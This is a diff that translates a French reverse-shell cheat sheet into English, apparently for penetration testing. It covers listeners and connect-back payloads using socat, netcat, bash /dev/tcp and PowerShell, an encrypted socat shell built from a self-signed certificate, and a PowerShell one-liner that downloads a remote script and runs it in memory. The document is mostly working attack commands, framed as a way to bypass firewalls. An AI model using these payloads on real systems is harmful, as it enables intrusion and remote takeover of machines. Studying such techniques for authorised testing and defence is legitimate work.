@@ -1,31 +1,31 @@
 # Reverse shell
 
-Se produise lorsque la cible est obligée d’exécuter du code qui se reconnecte à votre ordinateur.
+Occur when the target is forced to execute code that reconnects to your computer.
 
-C'est un bon moyen de contourner les règles de pare-feu qui peuvent vous empêcher de vous connecter à des ports arbitraires sur la cible
+This is a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target
 
-**NB: L'inconvénient est que, lorsque vous recevez un shell d'une machine via Internet, vous devrez configurer votre propre réseau pour accepter le shell.**
+**NB: The disadvantage is that, when you receive a shell from a machine via the Internet, you will need to configure your own network to accept the shell.**
 
 
 ## Socat
 
-Demarrer un ecouteur de shell 
+Start a shell listener
 
 ```sh
 socat TCP-L:4444 -
 ```
 
 ```sh
-socat TCP:<ATTACK-IP>:<PORT> EXEC:powershell.exe,pipes
+socat TCP:<ATTACK-IP>:<PORT> EXEC:powershell.exe,pipes
 ```
 
 ```sh
 socat TCP:<ATTACK-IP>:<PORT> EXEC:"bash -li"
 ```
 
-### Shell inversé Linux TTY entièrement stable
+### Fully stable Linux TTY reverse shell
 
-Demarrer un ecouteur
+Start a listener
 
 ```sh
 socat TCP-L:4444 FILE:`tty`,raw,echo=0
@@ -35,21 +35,21 @@ socat TCP-L:4444 FILE:`tty`,raw,echo=0
 socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
-### Shell cryptées
+### Encrypted shells
 
-Générer un certificat afin d'utiliser des shells cryptés
+Generate a certificate to use encrypted shells
 
 ```sh
 openssl req --newkey rsa:2028 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
 ```
 
-Fusionner les deux fichiers en un seul 
+Merge the two files into one
 
 ```sh
 cat shell.key shell.crt > shell.pem
 ```
 
-Demarrer un ecouteur avec le fichier
+Start a listener with the file
 
 ```sh
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
@@ -60,9 +60,9 @@ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
 socat OPENSSL:<ATTACKER-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 ```
 
-### Shell communes
+### Common shells
 
-Demarrer un ecouteur
+Start a listener
 
 ```sh
 nc -nlvp <PORT>
@@ -78,15 +78,15 @@ bash -c 'bash -i >& /dev/tcp/10.10.15.4/9001 0>&1
 ```
 
 
-## PowerShell 
+## PowerShell
 
-Telecharger et executer un reverse-shell en memoire
+Download and execute a reverse-shell in memory
 
 ```sh
 powershell iex (New-Object Net.WebClient).DownloadString('http://ip:port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACK-IP> -Port 443
 ```
 
-Executer ceci dans powershell
+Execute this in powershell
 
 ```c
 $client = New-Object System.Net.Sockets.TCPClient('<ATTACK-IP>', '443');
@@ -106,7 +106,7 @@ $client.Close();
 
 ## PowerCat
 
-C'est la version powershell de netcat
+It's the powershell version of netcat
 
 ```sh
 . .\powercat.ps1
